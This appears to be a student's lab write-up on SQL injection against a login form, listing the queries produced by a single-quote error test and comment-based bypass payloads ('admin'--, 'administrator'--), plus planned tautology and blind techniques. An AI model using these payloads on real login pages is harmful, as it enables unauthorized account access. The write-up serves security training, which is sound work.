# SQL Injection — Login Targeting (Lab 2)

## Goal

Perform a SQL injection (SQLi) attack to log in as the admin user.

## Quick analysis

- Initial test: sending a single quote (') caused a 500 error. That indicates the application is likely vulnerable to SQL injection.

## Tests and queries tried

1. Normal login attempt (control):

```sql
SELECT firstname FROM users WHERE username = 'admin' AND password = 'admin'
```

2. Causing an error by injecting a quote into the username:

```sql
SELECT firstname FROM users WHERE username = ''' AND password = 'admin'
```

This query produced an error (500), confirming a parsing/SQL error on user input.

3. Attempted comment-based bypass (did not work in this app):

```sql
SELECT firstname FROM users WHERE username = 'admin'--' AND password = 'admin'
```

4. Tried different administrative usernames (example):

```sql
SELECT firstname FROM users WHERE username = 'administrator'--' AND password = 'admin'
```

Note: the application used a different admin username (e.g., `administrator`) rather than `admin`.

## Conclusion / next steps

- The single-quote test caused a server error — the app is likely vulnerable to SQL injection.
- Next steps: craft conditional or tautology-based payloads (or blind/time-based techniques) to verify and extract the admin account, trying variations of admin usernames (e.g., `admin`, `administrator`, `root`, `sysadmin`).

Keep tests controlled and only run against authorized targets.
